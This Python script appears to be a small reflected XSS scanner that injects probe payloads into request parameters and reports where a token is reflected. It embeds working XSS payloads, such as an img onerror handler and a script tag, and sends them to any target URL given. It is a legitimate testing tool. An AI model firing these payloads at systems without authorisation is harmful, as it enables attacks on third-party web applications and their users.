#!/usr/bin/env python3
"""
Minimal Reflected XSS scanner (MVP)
- Single-file runnable example.
- Supports GET and POST form scanning.
- PayloadGenerator supports: attribute-name, attribute-value, text-node.
- Detection: simple substring match of unique token.
- Reports to terminal and optionally to report.html.

How to run (example):
  python scanner.py --url "http://localhost:5000/reflect" --params "q,id" --method GET --report html

Notes:
- attribute-name test injects the payload as the parameter name: ?PAYLD_xxx=1
- Keep payloads small and unique so detection is reliable.
"""

import argparse
import random
import string
import time
import html
from typing import List, Dict, Optional
import requests
from bs4 import BeautifulSoup

# ----------------------
# Small utilities
# ----------------------
def token(n=6):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def make_unique_token(prefix='PAY'):
    return f"{prefix}_{token(6)}"

# ----------------------
# Minimal PayloadGenerator
# ----------------------
class PayloadGenerator:
    """
    Very small payload generator. For each context it returns a short list
    of payload strings that include a unique token for detection.
    Contexts supported: 'attribute-name', 'attribute-value', 'text-node'
    """
    def __init__(self):
        pass

    def generate(self, context: str, param: str, limit: int = 2) -> List[str]:
        t = make_unique_token()
        if context == 'attribute-name':
            # For attribute-name we return the token itself which will be used as parameter NAME
            return [t]
        elif context == 'attribute-value':
            # variants that break out of attribute or add event handler
            return [
                f'">{t}<',                     # closes attribute and adds token in HTML
                f'"><img src=x onerror=alert("{t}")>',  # classic img onerror
            ][:limit]
        elif context == 'text-node':
            return [
                f'<script>/*{t}*/</script>',
                t
            ][:limit]
        else:
            return [t]

# ----------------------
# Simple detector
# ----------------------
def detect_reflection(response_text: str, token_str: str) -> Optional[Dict]:
    """Return a small dict with detection info or None."""
    if token_str not in response_text:
        return None

    # Try quick classification with BeautifulSoup
    soup = BeautifulSoup(response_text, 'html.parser')

    # 1) attribute-name: check if any element name contains token (rare) or attribute names
    for el in soup.find_all():
        # attribute names
        for attr in (el.attrs or {}):
            if token_str in str(attr):
                return {'context': 'attribute-name', 'snippet': str(el)[:300]}
    # 2) attribute values
    for el in soup.find_all():
        for val in (el.attrs.values() if el.attrs else []):
            try:
                if isinstance(val, list):
                    if any(token_str in v for v in val):
                        return {'context': 'attribute-value', 'snippet': str(el)[:300]}
                else:
                    if token_str in str(val):
                        return {'context': 'attribute-value', 'snippet': str(el)[:300]}
            except Exception:
                continue
    # 3) script contents
    for s in soup.find_all('script'):
        if s.string and token_str in s.string:
            return {'context': 'script', 'snippet': (s.string[:300] if s.string else '')}
    # 4) text node fallback
    if token_str in soup.get_text():
        return {'context': 'text-node', 'snippet': soup.get_text()[:300]}

    return {'context': 'unknown', 'snippet': (response_text[:300])}

# ----------------------
# Request sender (very small)
# ----------------------
def send_request(url: str, method: str, param_name: str, param_value: str,
                 inject_name: bool = False, headers: Dict = None, timeout: int = 10):
    """
    If inject_name is True, payload goes into the parameter NAME:
      e.g., ?<param_value>=1
    Else payload goes into param_value for param_name:
      ?param_name=<param_value>
    """
    headers = headers or {}
    method = method.upper()
    if inject_name:
        params = {param_value: '1'}  # dummy value
        if method == 'GET':
            return requests.get(url, params=params, headers=headers, timeout=timeout)
        else:
            # send both query and post form to increase chance of reflection
            return requests.post(url, params=params, data={'dummy': '1'}, headers=headers, timeout=timeout)
    else:
        if method == 'GET':
            return requests.get(url, params={param_name: param_value}, headers=headers, timeout=timeout)
        else:
            return requests.post(url, data={param_name: param_value}, headers=headers, timeout=timeout)

# ----------------------
# Simple report writers
# ----------------------
def print_terminal_report(findings: List[Dict]):
    if not findings:
        print("[+] No reflections found.")
        return
    print("\n=== Reflections Found ===")
    for f in findings:
        print(f"- URL: {f['url']}")
        print(f"  Param: {f['param']}")
        print(f"  Payload: {f['payload']}")
        print(f"  Detected as: {f['detected_context']}")
        snippet = f.get('snippet','') or ''
        print(f"  Snippet: {snippet[:200].replace(chr(10),' ')}")
        print("-" * 40)

def write_simple_html_report(findings: List[Dict], out='report.html'):
    rows = []
    for f in findings:
        rows.append(f"""
        <tr>
          <td>{html.escape(f['url'])}</td>
          <td>{html.escape(f['param'])}</td>
          <td>{html.escape(f['payload'])}</td>
          <td>{html.escape(f['detected_context'])}</td>
          <td><pre>{html.escape(f.get('snippet',''))}</pre></td>
        </tr>
        """)
    doc = f"""
    <html><head><meta charset="utf-8"><title>XSS report</title></head><body>
    <h2>Reflected XSS Report</h2>
    <table border=1 cellpadding=6 cellspacing=0>
      <thead><tr><th>URL</th><th>Param</th><th>Payload</th><th>Context</th><th>Snippet</th></tr></thead>
      <tbody>
        {''.join(rows)}
      </tbody>
    </table>
    </body></html>
    """
    with open(out, 'w', encoding='utf-8') as fh:
        fh.write(doc)
    print(f"[+] HTML report saved to {out}")

# ----------------------
# Main simple scanner
# ----------------------
def main():
    parser = argparse.ArgumentParser(description="Tiny reflected XSS scanner (MVP)")
    parser.add_argument('--url', required=True, help='Target URL')
    parser.add_argument('--params', required=True, help='Comma-separated params, e.g., q,id')
    parser.add_argument('--method', default='GET', choices=['GET','POST'])
    parser.add_argument('--contexts', default='attribute-name,attribute-value,text-node',
                        help='Comma-separated contexts to test (default: three)')
    parser.add_argument('--report', default='terminal', choices=['terminal','html'])
    parser.add_argument('--timeout', type=int, default=8)
    args = parser.parse_args()

    url = args.url
    params = [p.strip() for p in args.params.split(',') if p.strip()]
    method = args.method.upper()
    contexts = [c.strip() for c in args.contexts.split(',') if c.strip()]
    report_mode = args.report

    pg = PayloadGenerator()
    findings = []

    print(f"[+] Scanning {url} method={method} params={params} contexts={contexts}")

    # For each param and context generate payloads and test
    for p in params:
        for ctx in contexts:
            payloads = pg.generate(ctx, p, limit=2)  # small limit for speed
            for pl in payloads:
                inject_name = (ctx == 'attribute-name')
                try:
                    resp = send_request(url, method, p, pl, inject_name, timeout=args.timeout)
                    text = resp.text or ''
                    detection = detect_reflection(text, pl)
                    if detection:
                        findings.append({
                            'url': resp.url,
                            'param': pl if inject_name else p,
                            'payload': pl,
                            'detected_context': detection.get('context'),
                            'snippet': detection.get('snippet')
                        })
                        print(f"[+] Found reflection: param={'(name)' if inject_name else p} payload={pl} ctx={detection.get('context')}")
                except Exception as e:
                    print(f"[!] Request error for param={p} payload={pl}: {e}")

    # Reporting
    if report_mode == 'html':
        write_simple_html_report(findings)
    else:
        print_terminal_report(findings)

if __name__ == '__main__':
    main()
